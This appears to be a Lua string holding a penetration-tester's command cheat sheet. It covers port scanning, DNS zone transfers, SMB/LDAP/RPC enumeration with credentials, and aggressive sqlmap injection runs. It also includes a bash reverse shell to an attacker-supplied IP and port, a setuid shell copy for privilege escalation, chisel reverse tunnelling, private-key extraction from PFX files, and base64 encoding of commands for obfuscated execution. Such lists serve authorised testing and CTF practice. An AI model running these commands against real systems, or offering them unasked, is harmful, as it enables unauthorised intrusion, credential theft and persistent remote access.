shell_snippet = [[
nmap -sSU -p- -Pn --max-retries=0 -T4 -v IP
nmap -Pn -p5985-5986 IP
nmap -6 IPv6
dig axfr @IP DOMAIN
smbclient -U USERNAME -L IP
smbclient -U geust '\\IP\DIRECTORY'
ldapsearch -x -H ldap://IP -s base
ldapsearch -x -H ldap://IP -b 'dc=DC0,dc=DC1'
ldapsearch -x -H ldap://IP -D USERNAME@DOMAIN -w PASSWORD -b 'dc=DC0,dc=DC1'
rpcclient -U USERNAME IP
curl -u USERNAME:PASSWORD pop3://IP
bash -i >& /dev/tcp/IP/PORT 0>&1
cp /bin/sh /tmp/sh && chmod +s /tmp/sh
ip link add dummy0 type dummy && ip link delete dummy0
openssl pkcs12 -in PFX_PATH -out PEM_PATH -nocerts -nodes
openssl pkcs12 -in PFX_PATH -out CRT_PATH -nokeys -nodes
sqlmap -r PATH --technique=BEUS --level=5 --risk=3 -v 3 --batch
sqlmap -r PATH --privileges
chisel server -p PORT --reverse
chisel client IP:PORT R:socks
chisel client IP:PORT R:PORT:IP:PORT
echo -n COMMAND | iconv --to-code UTF-16LE | base64 -w 0
]]
